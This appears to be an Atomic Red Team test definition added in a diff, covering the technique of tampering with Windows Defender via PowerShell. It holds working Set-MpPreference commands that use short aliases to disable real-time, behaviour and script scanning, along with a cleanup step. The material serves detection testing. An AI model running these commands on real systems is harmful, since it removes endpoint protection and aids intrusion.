@@ -1,0 +1,25 @@
+{
+    "name": "Tamper with Windows Defender ATP using Aliases - PowerShell",
+    "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled in Windows settings. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "Set-MpPreference -drtm $True\nSet-MpPreference -dbm $True\nSet-MpPreference -dscrptsc $True\nSet-MpPreference -dbaf $True\n",
+        "cleanup_command": "Set-MpPreference -drtm 0\nSet-MpPreference -dbm 0\nSet-MpPreference -dscrptsc 0\nSet-MpPreference -dbaf 0\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1562.001",
+    "tactics": [
+        "Defense Evasion"
+    ],
+    "technique": "Disable or Modify Tools",
+    "source": "ART",
+    "uuid": "c531aa6e-9c97-4b29-afee-9b7be6fc8a64",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
